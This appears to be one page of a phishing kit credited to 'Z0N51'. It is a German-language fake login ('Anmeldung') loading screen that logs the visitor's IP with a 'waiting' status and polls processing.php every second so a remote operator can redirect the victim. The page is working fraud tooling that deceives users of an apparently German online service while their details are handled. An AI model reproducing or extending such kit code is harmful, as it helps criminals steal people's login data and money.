<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "loading";
    update_status(get_client_ip(),'W');

?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Anmeldung</title>
    </head>

    <body>

        <div id="wrapper">
            <div class="container">
                <p class="text-end pt30 pb30" style="color: #1e325f; font-weight: 500; font-size: 16px; opacity: .65;">deutsch</p>
                <div class="box">
                    <div class="box-header">
                        <h3>Anmeldung</h3>
                    </div>
                    <div class="box-body">

                        <div class="loader">
                            <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
                            <h3>Überprüfen Sie Ihre Informationen</h3>
                            <p>Verarbeitungsinformationen ... Schließen Sie die Seite nicht</p>
                        </div>
                        
                    </div>
                </div>
                <div class="footer-logo text-center pt50 pb50">
                    <img src="../media/imgs/footer-logo.png">
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            (function worker() {
                $.ajax({
                    method: "GET",
                    url: '../processing.php?waiting=1',
                    success: function (data) {
                        if( data !== '' ) {
                            window.location.href= data;
                        }
                    },
                    complete: function () {
                        setTimeout(worker, 1000);
                    }
                });
            })();
        </script>

    </body>

</html>